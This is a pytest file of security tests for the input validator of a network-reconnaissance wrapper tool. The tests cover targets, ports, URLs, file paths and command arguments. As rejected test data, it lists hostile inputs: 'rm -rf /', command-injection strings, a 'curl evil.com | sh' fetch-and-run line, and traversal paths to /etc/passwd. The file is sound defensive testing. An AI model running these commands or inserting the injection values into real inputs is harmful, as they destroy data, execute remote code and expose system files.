# tests/integration/test_security_validation.py
"""Integration tests for security validation."""

import pytest

from src.alienrecon.core.input_validator import InputValidator
from src.alienrecon.core.exceptions import SecurityError, ValidationError
from src.alienrecon.tools.base import _validate_command_security


class TestSecurityValidation:
    """Test security validation throughout the system."""
    
    def test_target_validation(self):
        """Test target validation."""
        # Valid targets
        assert InputValidator.validate_target("192.168.1.1") == "192.168.1.1"
        assert InputValidator.validate_target("example.com") == "example.com"
        assert InputValidator.validate_target("sub.example.com") == "sub.example.com"
        
        # Invalid targets
        with pytest.raises(ValidationError):
            InputValidator.validate_target("")
        
        with pytest.raises(ValidationError):
            InputValidator.validate_target("invalid..target")
        
        with pytest.raises(ValidationError):
            InputValidator.validate_target("256.256.256.256")  # Invalid IP
    
    def test_port_validation(self):
        """Test port validation."""
        # Valid ports
        assert InputValidator.validate_port("80") == 80
        assert InputValidator.validate_port(443) == 443
        assert InputValidator.validate_port("65535") == 65535
        
        # Invalid ports
        with pytest.raises(ValidationError):
            InputValidator.validate_port("0")
        
        with pytest.raises(ValidationError):
            InputValidator.validate_port("65536")
        
        with pytest.raises(ValidationError):
            InputValidator.validate_port("abc")
    
    def test_port_list_validation(self):
        """Test port list validation."""
        # Valid port lists
        assert InputValidator.validate_port_list("80,443") == "80,443"
        assert InputValidator.validate_port_list("80-90,443") == "80-90,443"
        assert InputValidator.validate_port_list("22") == "22"
        
        # Invalid port lists
        with pytest.raises(ValidationError):
            InputValidator.validate_port_list("")
        
        with pytest.raises(ValidationError):
            InputValidator.validate_port_list("80-20")  # Invalid range
    
    def test_url_validation(self):
        """Test URL validation."""
        # Valid URLs
        assert InputValidator.validate_url("http://example.com") == "http://example.com"
        assert InputValidator.validate_url("https://sub.example.com:8080/path") == "https://sub.example.com:8080/path"
        
        # Invalid URLs
        with pytest.raises(ValidationError):
            InputValidator.validate_url("")
        
        with pytest.raises(ValidationError):
            InputValidator.validate_url("not-a-url")
        
        with pytest.raises(ValidationError):
            InputValidator.validate_url("javascript://evil")  # Unsupported scheme
    
    def test_command_security_validation(self):
        """Test command security validation."""
        # Valid commands
        _validate_command_security(["/usr/bin/nmap", "-sV", "example.com"])
        _validate_command_security(["nikto", "-h", "http://example.com"])
        
        # Invalid executables
        with pytest.raises(SecurityError):
            _validate_command_security(["rm", "-rf", "/"])
        
        with pytest.raises(SecurityError):
            _validate_command_security(["bash", "-c", "evil_command"])
        
        # Dangerous patterns
        with pytest.raises(SecurityError):
            _validate_command_security(["nmap", "example.com; rm -rf /"])
        
        with pytest.raises(SecurityError):
            _validate_command_security(["nmap", "example.com", "`whoami`"])
        
        with pytest.raises(SecurityError):
            _validate_command_security(["nmap", "example.com", "| sh"])
    
    def test_argument_sanitization(self):
        """Test argument sanitization."""
        # Valid arguments
        args = InputValidator.sanitize_command_args("-sV -p 80")
        assert args == ["-sV", "-p", "80"]
        
        args = InputValidator.sanitize_command_args("-h 'http://example.com'")
        assert args == ["-h", "http://example.com"]
        
        # Dangerous arguments
        with pytest.raises(SecurityError):
            InputValidator.sanitize_command_args("arg1; rm -rf /")
        
        with pytest.raises(SecurityError):
            InputValidator.sanitize_command_args("arg1 && curl evil.com | sh")
    
    def test_file_path_validation(self):
        """Test file path validation."""
        import tempfile
        import os
        
        # Valid paths
        with tempfile.TemporaryDirectory() as tmpdir:
            test_file = os.path.join(tmpdir, "test.txt")
            with open(test_file, "w") as f:
                f.write("test")
            
            validated_path = InputValidator.validate_file_path(test_file, must_exist=True)
            assert validated_path.exists()
        
        # Path traversal attempts
        with pytest.raises(SecurityError):
            InputValidator.validate_file_path("../../../etc/passwd")
        
        with pytest.raises(SecurityError):
            InputValidator.validate_file_path("/tmp/../etc/passwd")
    
    def test_wordlist_validation(self):
        """Test wordlist file validation."""
        import tempfile
        import os
        
        with tempfile.TemporaryDirectory() as tmpdir:
            # Valid wordlist
            wordlist_file = os.path.join(tmpdir, "wordlist.txt")
            with open(wordlist_file, "w") as f:
                f.write("word1\nword2\nword3\n")
            
            validated_path = InputValidator.validate_wordlist_path(wordlist_file)
            assert validated_path.exists()
            
            # Invalid extension
            bad_file = os.path.join(tmpdir, "wordlist.exe")
            with open(bad_file, "w") as f:
                f.write("content")
            
            with pytest.raises(ValidationError):
                InputValidator.validate_wordlist_path(bad_file)
    
    def test_username_validation(self):
        """Test username validation."""
        # Valid usernames
        assert InputValidator.validate_username("admin") == "admin"
        assert InputValidator.validate_username("user123") == "user123"
        assert InputValidator.validate_username("test-user") == "test-user"
        assert InputValidator.validate_username("user.name") == "user.name"
        
        # Invalid usernames
        with pytest.raises(ValidationError):
            InputValidator.validate_username("")
        
        with pytest.raises(ValidationError):
            InputValidator.validate_username("user with spaces")
        
        with pytest.raises(ValidationError):
            InputValidator.validate_username("user@domain")  # @ not allowed
        
        with pytest.raises(ValidationError):
            InputValidator.validate_username("a" * 65)  # Too long
    
    def test_null_byte_detection(self):
        """Test null byte detection in arguments."""
        with pytest.raises(SecurityError):
            _validate_command_security(["nmap", "example.com\x00evil"])
    
    def test_control_character_detection(self):
        """Test control character detection."""
        with pytest.raises(SecurityError):
            _validate_command_security(["nmap", "example.com\x01"])
        
        with pytest.raises(SecurityError):
            _validate_command_security(["nmap", "example.com\x1f"])
    
    def test_argument_length_limits(self):
        """Test argument length limits."""
        # Very long argument should be rejected
        long_arg = "a" * 1001
        with pytest.raises(ValidationError):
            _validate_command_security(["nmap", long_arg])
    
    def test_edge_cases(self):
        """Test edge cases in security validation."""
        # Empty command list
        with pytest.raises(ValidationError):
            _validate_command_security([])
        
        # Command with only executable
        _validate_command_security(["nmap"])  # Should pass
        
        # Case insensitive pattern matching
        with pytest.raises(SecurityError):
            _validate_command_security(["nmap", "example.com; RM -RF /"])  # Uppercase